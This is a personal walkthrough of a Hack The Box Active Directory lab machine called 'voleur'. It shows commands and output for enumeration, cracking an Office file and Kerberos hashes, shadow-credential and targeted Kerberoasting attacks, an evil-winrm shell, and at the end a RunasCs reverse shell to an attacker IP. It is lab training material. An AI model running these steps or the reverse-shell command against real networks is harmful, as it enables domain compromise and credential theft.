
| Property         | Value                         |
| ---------------- | ----------------------------- |
| **OS**           | Linux / Windows               |
| **Difficulty**   | Easy / Medium / Hard / Insane |
| **Release Date** | YYYY-MM-DD                    |
| **State**        | YYYY-MM-DD                    |
| **IP**           | 10.10.10.X                    |
| **Techniques**   | technique-1, technique-2      |
| **Tags**         | #web #privesc #linux          |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---

## initial creds

```
ryan.naylor / HollowOct31Nyt
```
## Enumeration

### Nmap Scan

```
sudo nmap -sV -sC voleur.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-10-05 15:47 EDT
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 15:48 (0:00:00 remaining)
Nmap scan report for voleur.htb (10.129.232.130)
Host is up (0.030s latency).
Not shown: 987 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-06 03:47:51Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m01s
| smb2-time: 
|   date: 2026-10-06T03:47:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.22 seconds

```

### Service Enumeration

```
 sudo ntpdate voleur.htb                                         
2026-10-05 23:57:38.982151 (-0400) +28814.853587 +/- 0.014269 voleur.htb 10.129.232.130 s1 no-leap
CLOCK: time stepped by 28814.853587
                                                                                                                    
┌──(kali㉿kali)-[~/machines/voleur]
└─$ nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares
SMB         10.129.232.130  445    10.129.232.130   [*]  x64 (name:10.129.232.130) (domain:10.129.232.130) (signing:True) (SMBv1:False) (NTLM:False)                                                                                    
SMB         10.129.232.130  445    10.129.232.130   [-] 10.129.232.130\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

## Kerberos ticket:

editing krb5.conf

```
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    VOLEUR.HTB = {
        kdc = DC.voleur.htb
        admin_server = DC.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

getting a ticket as ryan:

```
kinit ryan.naylor@VOLEUR.HTB
Password for ryan.naylor@VOLEUR.HTB:
```

```
export KRB5CCNAME=ryan.naylor.ccache
```

```
sudo ntpdate DC.voleur.htb                                            
2026-10-06 00:09:23.010738 (-0400) +28829.156843 +/- 0.014653 DC.voleur.htb 10.129.232.130 s1 no-leap
CLOCK: time stepped by 28829.156843
```

``` nxc smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         DC.voleur.htb   445    DC               [*] Enumerated shares
SMB         DC.voleur.htb   445    DC               Share           Permissions     Remark
SMB         DC.voleur.htb   445    DC               -----           -----------     ------
SMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin
SMB         DC.voleur.htb   445    DC               C$                              Default share
SMB         DC.voleur.htb   445    DC               Finance                         
SMB         DC.voleur.htb   445    DC               HR                              
SMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC
SMB         DC.voleur.htb   445    DC               IT              READ            
SMB         DC.voleur.htb   445    DC               NETLOGON        READ            Logon server share 
SMB         DC.voleur.htb   445    DC               SYSVOL          READ            Logon server share 
                                                                                                           
```

## users enumeration

```
nxc smb DC.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users
SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         DC.voleur.htb   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         DC.voleur.htb   445    DC               Administrator                 2025-01-28 20:35:13 0       Built-in account for administering the computer/domain 
SMB         DC.voleur.htb   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         DC.voleur.htb   445    DC               krbtgt                        2025-01-29 08:43:06 0       Key Distribution Center Service Account 
SMB         DC.voleur.htb   445    DC               ryan.naylor                   2025-01-29 09:26:46 0       First-Line Support Technician 
SMB         DC.voleur.htb   445    DC               marie.bryant                  2025-01-29 09:21:07 0       First-Line Support Technician 
SMB         DC.voleur.htb   445    DC               lacey.miller                  2025-01-29 09:20:10 0       Second-Line Support Technician 
SMB         DC.voleur.htb   445    DC               svc_ldap                      2025-01-29 09:20:54 0        
SMB         DC.voleur.htb   445    DC               svc_backup                    2025-01-29 09:20:36 0        
SMB         DC.voleur.htb   445    DC               svc_iis                       2025-01-29 09:20:45 0        
SMB         DC.voleur.htb   445    DC               jeremy.combs                  2025-01-29 15:10:32 0       Third-Line Support Technician 
SMB         DC.voleur.htb   445    DC               svc_winrm                     2025-01-31 09:10:12 0        
SMB         DC.voleur.htb   445    DC               [*] Enumerated 11 local users: VOLEUR

```

## Writable objects

```
 bloodyAD --host DC.voleur.htb --dns 10.129.232.130 -d voleur.htb -k ccache=./ryan.naylor.ccache get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=voleur,DC=htb
permission: WRITE

distinguishedName: CN=Ryan Naylor,OU=First-Line Support Technicians,DC=voleur,DC=htb
permission: WRITE

distinguishedName: DC=voleur.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=voleur,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.voleur.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=voleur,DC=htb
permission: CREATE_CHILD

```
### Share enumeration

```
smbclient -k //DC.voleur.htb/IT
WARNING: The option -k|--kerberos is deprecated!
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 29 04:10:01 2025
  ..                                DHS        0  Thu Jul 24 16:09:59 2025
  First-Line Support                  D        0  Wed Jan 29 04:40:17 2025

                5311743 blocks of size 4096. 999130 blocks available
smb: \> cd First-Line Support
cd \First-Line\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> cd 'First-Line Support'
cd \'First-Line\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \> cd "First-Line Support"
smb: \First-Line Support\> ls
  .                                   D        0  Wed Jan 29 04:40:17 2025
  ..                                  D        0  Wed Jan 29 04:10:01 2025
  Access_Review.xlsx                  A    16896  Thu Jan 30 09:14:25 2025

                5311743 blocks of size 4096. 999130 blocks available
smb: \First-Line Support\> get Access_Review.xlsx
getting file \First-Line Support\Access_Review.xlsx of size 16896 as Access_Review.xlsx (136.4 KiloBytes/sec) (average 136.4 KiloBytes/sec)
smb: \First-Line Support\> 

```

using office2john 

```
$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```

```
 john access_review.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (?)     
1g 0:00:00:02 DONE (2026-10-05 16:23) 0.4878g/s 390.2p/s 390.2c/s 390.2C/s football1..martha
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

decrypted file:

| User             | Job Title                      | Permissions              | Notes                                                                 |
| ---------------- | ------------------------------ | ------------------------ | --------------------------------------------------------------------- |
| Ryan.Naylor      | First-Line Support Technician  | SMB                      | Has Kerberos Pre-Auth disabled temporarily to test legacy systems.    |
| Marie.Bryant     | First-Line Support Technician  | SMB                      |                                                                       |
| Lacey.Miller     | Second-Line Support Technician | Remote Management Users  |                                                                       |
| Todd.Wolfe       | Second-Line Support Technician | Remote Management Users  | Leaver. Password was reset to NightT1meP1dg3on14 and account deleted. |
| Jeremy.Combs     | Third-Line Support Technician  | Remote Management Users. | Has access to Software folder.                                        |
| Administrator    | Administrator                  | Domain Admin             | Not to be used for daily tasks!                                       |
|                  |                                |                          |                                                                       |
|                  |                                |                          |                                                                       |
| Service Accounts |                                |                          |                                                                       |
| svc_backup       |                                | Windows Backup           | Speak to Jeremy!                                                      |
| svc_ldap         |                                | LDAP Services            | P/W - M1XyC9pW7qT5Vn                                                  |
| svc_iis          |                                | IIS Administration       | P/W - N5pXyW1VqM7CZ8                                                  |
| svc_winrm        |                                | Remote Management        | Need to ask Lacey as she reset this recently.                         |
## Bloodhound enumeration

```
sudo ntpdate DC.voleur.htb && sudo -E bloodhound-python -k -u ryan.naylor -ns 10.129.232.130 -d voleur.htb -c all --zip -no-pass
2026-10-06 00:55:00.494694 (-0400) +0.000956 +/- 0.014267 DC.voleur.htb 10.129.232.130 s1 no-leap
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: voleur.htb
INFO: Using TGT from cache
INFO: Found TGT with correct principal in ccache file.
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.voleur.htb
INFO: Found 12 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 5 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.voleur.htb
WARNING: Failed to get service ticket for DC.voleur.htb, skipping host
INFO: Done in -481M 11S
INFO: Compressing output into 20261006005501_bloodhound.zip

```
## Foothold


### Exploitation


```shell
sudo ntpdate DC.voleur.htb && python3 pywhisker.py -d "voleur.htb" -u "svc_ldap" --target "lacey.miller" --action "add" -k --dc-ip 10.129.232.130 --dc-host DC.voleur.htb -v
2026-10-06 01:18:08.997778 (-0400) +28858.196057 +/- 0.015583 DC.voleur.htb 10.129.232.130 s1 no-leap
CLOCK: time stepped by 28858.196057
/home/kali/tools/pywhisker/pywhisker/pywhisker.py:356: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
[*] Searching for the target account
[*] Target user found: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 7a4db2e8-2afd-20d4-d786-fd85c858bd7c
[*] Updating the msDS-KeyCredentialLink attribute of lacey.miller
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[VERBOSE] No filename was provided. The certificate(s) will be stored with the filename: v9sSCXdM
[VERBOSE] No pass was provided. The certificate will be stored with the password: oPOUL9gi633SqmNH6dXP
[*] Converting PEM -> PFX with cryptography: v9sSCXdM.pfx
[+] PFX exportiert nach: v9sSCXdM.pfx
[i] Passwort für PFX: oPOUL9gi633SqmNH6dXP
[+] Saved PFX (#PKCS12) certificate & key at path: v9sSCXdM.pfx
[*] Must be used with password: oPOUL9gi633SqmNH6dXP
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[VERBOSE] Run the following command to obtain a TGT
[VERBOSE] python3 PKINITtools/gettgtpkinit.py -cert-pfx v9sSCXdM.pfx -pfx-pass oPOUL9gi633SqmNH6dXP voleur.htb/lacey.miller v9sSCXdM.ccache

```

in theory should have worked but the machine is bugged as fuck

## Targeted kerberoast:

```
 python3 targetedKerberoast.py -v -d 'voleur.htb' -u 'svc_ldap' -k --no-pass --dc-ip 10.129.232.130 --dc-host DC.voleur.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$1be057d70f44aefcdf08694eb70ea4ea$6a3f3b1ae85d3e2693b8493d1723765860d0f4cf9e318be711742a8d0ed2d2fea97b271c2996f5978248514154ecc513e88a13974bd3b7162f869a03a73f4e4bb343a2f2ad7302bace41b383ebafc80f7306704d00357049f963862d73defba30f615d8067b55421096fc0eb756e1ce6fec49cc226f9a0a096d167ddc3954d75ee4b74bcb269fddc04231054ae0411a12706ab84b824290a364c8b50cf126708675dbe7493acf4fb985ac841aa0bec28ba1dd7371e38d290952b319614523019aaa5c950ab44bcb67e8872478e7bacbf423e72da74d9132c6299ac20521b9f95e40e059a7ddcb811bedba35fc308eef63f4442dad425b67a4d8f432a675f20f45e1724f9544cc41c162095da5c13b4be43bdb7f28091f1558a73b7feee4f6ef6fff3f5a5fba444772c535bb1b2d46afcc2cd397a072bba99ba0d4c56f4079a94d5c6554f77245ef66184f31c0d5756eff84390bc82c35f97ba8b538ecff96240b1bcaa590fc8f877e875ffd357e70077ac7b71e5b10e45c4d982c534189737d5736f06b73107a6556ac82d6e2128b2dd250b21d00a7e76295705f6541caa377778e215236bac6a36145305493bb84ac02ae45f0b8a63ba2d04d2a3bc41adc3210a04406a6f6b5740d8801550161f23d46cfdd519b105f5bb2739cc0b98bccb662a182202cfbdd6f5d67144b4a0df6708cd0d19e07932dc8ae9c6961d331dfe9af4f3d1776a8c9b931c3399e20b0a57c16869e9717d78cef978191c61268557c393bbb3f8531f95967d2cb892d6e8e4cdb4930e37e9466b5f977a2afd4cd93039caf83100e148cf52d0269a30dbee54aeccbd352321cb8f48220068ed2ba5bdb1105cc40ec2de6df0fa520ba7d915fb247eec93e3b34c8a3be3354f2f42d3bef19ee1b43a2c49c678858fb5c88cc56fa4fdd171b652d09035e657e406cd8be58b06653b93ed03b490e71054a5aa16098e66f3c9c663be18288ed3eb2f57965e1fadbdd632805fcebd0b2929d16030906744c22e2bb74ff61b2177089fd81e37c3f6f35eab5245ee18007730de8382787d4588f9f737cf587e1b0e5ba775b9f69015bc3471aa2d76e80f4e179b3e7a57eaf8aa2ec635fd54c97e45eee7f0d18bc43d89896cb6dd5cf46ad6d6f1e31e431de2e436cbf20ad016c64cc537c7fb1248a46e4525f56de95a4c859840f9bd8b94db14e2e3b3c381c1490114fe5d1a68447acfb1433246a16e9bcd206ebab27362f5b1aab199dfc58a9b30d65c4dec01d970f69bd98856bf7cbc6a4e60d0cd609925b011569b5dbe2a831164140d880cbfe06acdfedd77c3cb1afded59bda7625efc7c67406dc6176c5c4ed111744411743b516d0015862a55cb811e8d403f529706d7650e7a5207dd2724fb9255dab72c55cbbd5ddd7ee1383d52e1c1bdfe765b2a7addc11e8a6a12a295a134ed917bf2c72433dcc6bdeeb1aae721159c9e8d9f8afbd4
[VERBOSE] SPN removed successfully for (lacey.miller)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$e7344a8ffda7789a7829faee497e8d53$b42f89d2afaa8a28d3a6df18e887903fd8e0760257b1d4d5d3d31405a0b9a5d0fa1e32d0c3faf67847b6d70ff69231f91c31ca9af4480697655d7f978dcf81c7208fcfac7bbc71dd626cba8a6f4540464b3794b34388abd13aa7a35ed23142c362536a9a4ca3c5e341e9448be8a3b979b34ee185195e0c4930403c4423d1817da04ce0cc13b7ca19ca040f5f3dbf32b073304a1dd33d9c0a1800984128c3cc2c056ef70013ba893bb14b2ea6b7c1475f7966f18ca6567590ce15f4878333e41ac7f91a60afe6b605ff0974a636e0cc91fc723f5ef070b1ea4eeb48107a4f5ca8a09b3220d4690e51635d8728feed08c07e0e4cf4b2e8c7294b15ad7e95a71a223aada9b5348f6788e0f4c4793f9a84b19b82a4aec013abf5257a07669fa1ab2bca9f74498fda2c8078caf0d62905c8e4af4a6768553bec62280a11f1e4273fb05fcbce2c2ba812795786cf0410168c03ecc0629797dbd59194ed5ddac772f617da7d4565c0a37e4864ea9069163275db67749b84b78c55baebaeda299e969aaabd3e75396f4387aeba8c52de798abf8dcc7c0198a1d3e7e5faf4076133016416ac3a3200989f1e495fdd094529d6ecc6eb4ae7c9b78cb7caa16428dc2828765dd47ff974ea0f8031ac3a0780b4c75581f4e2c4fed945632d84d706212022604de5eb6b75a03889f9a462145f26698a7a2e29d3edbb5c16d6c162f5baa7700b4a34b3ae6e6582d28770d2cf62bb52e6e0d703273588a3de6b78257dd817ea1637e05db4c71ad74969b3a6fde7802c447a613cd20c6073dc615cc6937892008c4f9c58f8c163ed9e0ed527700d5aac22a5ec1552ad8272d42313d68c93c3ad5ffa9c69361e77dc21cf6f78a1d5cff220a25d5b8a46a778557c91e3716fb646b043f0ddad2d546fb5b03f1edc021d02a2c747a0c7b5a9e22000cbc2bc3b0222f99da4c291b6b20bd7f6e40e63544f458547bccfa7dee43ba64225a85e425b9a129a5a95bbc5640d7649b89718b814e358d0072ddb33f676a07083ce9aafd91cf2accb46c591af9ffe470e06f468a44c63909734456333edd6489121d63d7fbf83798017cdbc1fd1899f4441f8a5f8f4ffbce827539b4064adca56e38c95255bf00e8914ae82c6b5aa16e6f91b443bc2fc8cfeb30a35dcaea544b01d904cd56fa5411eea31beb96e362789712c15ed4c9d70cc4c2649e856f1d3906292a8865780d3d2284be116333275664ebaa4cdec505c4dc937a33e64b4eddc63011ebb23ecf936a1ab587b3f0a8a45dd2e42d50b31c4e206c27a45de14b4802a21e2eb93e9e724d3a5643c89d13add7984fa45a331a9a32925eb689f2514ea1ffd14fced26170c207ec387a89b832395bf5d5a76d4e31b89c634b08f8de21c59bdd89efed7430c89cddc8f050bdaf4d40f87da52a93b13a26b56e22af0a075ec6dd5b8ca1258909cf476530ff2b532bc70926601cb447151ad
[VERBOSE] SPN removed successfully for (svc_winrm)

```

```
 hashcat -m 13100 svc_winrm.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1469/2939 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1075 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$e7344a8ffda7789a7829faee497e8d53$b42f89d2afaa8a28d3a6df18e887903fd8e0760257b1d4d5d3d31405a0b9a5d0fa1e32d0c3faf67847b6d70ff69231f91c31ca9af4480697655d7f978dcf81c7208fcfac7bbc71dd626cba8a6f4540464b3794b34388abd13aa7a35ed23142c362536a9a4ca3c5e341e9448be8a3b979b34ee185195e0c4930403c4423d1817da04ce0cc13b7ca19ca040f5f3dbf32b073304a1dd33d9c0a1800984128c3cc2c056ef70013ba893bb14b2ea6b7c1475f7966f18ca6567590ce15f4878333e41ac7f91a60afe6b605ff0974a636e0cc91fc723f5ef070b1ea4eeb48107a4f5ca8a09b3220d4690e51635d8728feed08c07e0e4cf4b2e8c7294b15ad7e95a71a223aada9b5348f6788e0f4c4793f9a84b19b82a4aec013abf5257a07669fa1ab2bca9f74498fda2c8078caf0d62905c8e4af4a6768553bec62280a11f1e4273fb05fcbce2c2ba812795786cf0410168c03ecc0629797dbd59194ed5ddac772f617da7d4565c0a37e4864ea9069163275db67749b84b78c55baebaeda299e969aaabd3e75396f4387aeba8c52de798abf8dcc7c0198a1d3e7e5faf4076133016416ac3a3200989f1e495fdd094529d6ecc6eb4ae7c9b78cb7caa16428dc2828765dd47ff974ea0f8031ac3a0780b4c75581f4e2c4fed945632d84d706212022604de5eb6b75a03889f9a462145f26698a7a2e29d3edbb5c16d6c162f5baa7700b4a34b3ae6e6582d28770d2cf62bb52e6e0d703273588a3de6b78257dd817ea1637e05db4c71ad74969b3a6fde7802c447a613cd20c6073dc615cc6937892008c4f9c58f8c163ed9e0ed527700d5aac22a5ec1552ad8272d42313d68c93c3ad5ffa9c69361e77dc21cf6f78a1d5cff220a25d5b8a46a778557c91e3716fb646b043f0ddad2d546fb5b03f1edc021d02a2c747a0c7b5a9e22000cbc2bc3b0222f99da4c291b6b20bd7f6e40e63544f458547bccfa7dee43ba64225a85e425b9a129a5a95bbc5640d7649b89718b814e358d0072ddb33f676a07083ce9aafd91cf2accb46c591af9ffe470e06f468a44c63909734456333edd6489121d63d7fbf83798017cdbc1fd1899f4441f8a5f8f4ffbce827539b4064adca56e38c95255bf00e8914ae82c6b5aa16e6f91b443bc2fc8cfeb30a35dcaea544b01d904cd56fa5411eea31beb96e362789712c15ed4c9d70cc4c2649e856f1d3906292a8865780d3d2284be116333275664ebaa4cdec505c4dc937a33e64b4eddc63011ebb23ecf936a1ab587b3f0a8a45dd2e42d50b31c4e206c27a45de14b4802a21e2eb93e9e724d3a5643c89d13add7984fa45a331a9a32925eb689f2514ea1ffd14fced26170c207ec387a89b832395bf5d5a76d4e31b89c634b08f8de21c59bdd89efed7430c89cddc8f050bdaf4d40f87da52a93b13a26b56e22af0a075ec6dd5b8ca1258909cf476530ff2b532bc70926601cb447151ad:AFireInsidedeOzarctica980219afi
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_wi...7151ad
Time.Started.....: Mon Oct  5 17:42:18 2026 (6 secs)
Time.Estimated...: Mon Oct  5 17:42:24 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1805.9 kH/s (1.73ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11472896/14344385 (79.98%)
Rejected.........: 0/11472896 (0.00%)
Restore.Point....: 11468800/14344385 (79.95%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: AK78910 -> ADRIANXXL
Hardware.Mon.#01.: Util: 85%

Started: Mon Oct  5 17:42:17 2026
Stopped: Mon Oct  5 17:42:26 2026

```

svc_winrm:AFireInsidedeOzarctica980219afi

```
impacket-getTGT -dc-ip 10.129.232.130 voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache

```

```
export KRB5CCNAME=svc_winrm.ccache
```

```
evil-winrm -i DC.voleur.htb -r voleur.htb
2026-10-06 02:04:38.751311 (-0400) +28853.996590 +/- 0.014309 DC.voleur.htb 10.129.232.130 s1 no-leap
CLOCK: time stepped by 28853.996590
Tue Oct  6 02:04:38 AM EDT 2026
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
Ticket cache: FILE:svc_winrm.ccache
Default principal: svc_winrm@VOLEUR.HTB

Valid starting       Expires              Service principal
10/06/2026 02:04:42  10/06/2026 12:04:42  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 10/07/2026 02:04:42
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> 

```

---
## User Flag


```
*Evil-WinRM* PS C:\Users\svc_winrm> ls


    Directory: C:\Users\svc_winrm


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         1/29/2025   7:07 AM                3D Objects
d-r---         1/29/2025   7:07 AM                Contacts
d-r---         1/31/2025   1:55 AM                Desktop
d-r---         1/29/2025   7:07 AM                Documents
d-r---         1/29/2025   7:07 AM                Downloads
d-r---         1/29/2025   7:07 AM                Favorites
d-r---         1/29/2025   7:07 AM                Links
d-r---         1/29/2025   7:07 AM                Music
d-r---         1/29/2025   7:07 AM                Pictures
d-r---         1/29/2025   7:07 AM                Saved Games
d-r---         1/29/2025   7:07 AM                Searches
d-r---         1/29/2025   7:07 AM                Videos


*Evil-WinRM* PS C:\Users\svc_winrm> cd Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> ls


    Directory: C:\Users\svc_winrm\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-ar---         10/5/2026   7:38 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> cat user.txt
131305f89e46111ca31de2ad19bd707d
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> 

```

### Lateral Movement from svc_ldap to todd wolfe

```
bloodyAD --host DC.voleur.htb --dns 10.129.232.130 -d voleur.htb -k ccache=./svc_ldap.ccache get writable                      
Clock skew detected. Adjusting local time by 8:00:51.084548. Retrying operation.

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=voleur,DC=htb
permission: WRITE

distinguishedName: OU=Second-Line Support Technicians,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=Lacey Miller,OU=Second-Line Support Technicians,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=svc_ldap,OU=Service Accounts,DC=voleur,DC=htb
permission: WRITE

distinguishedName: CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb
permission: WRITE

distinguishedName: DC=voleur.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=voleur,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.voleur.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=voleur,DC=htb
permission: CREATE_CHILD

```

```
bloodyAD -H DC.voleur.htb --dns 10.129.232.130 -d voleur.htb -k ccache=./svc_ldap.ccache \
  set restore "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb"
Clock skew detected. Adjusting local time by 8:00:58.545705. Retrying operation.
[+] CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb has been restored successfully under CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
```

## Alternative

```
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> upload RunasCs.exe
                                        
Info: Uploading /home/kali/tools/RunasCs/RunasCs.exe to C:\Users\svc_winrm\Documents\RunasCs.exe
                                        
Data: 68948 bytes of 68948 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.15.74:443
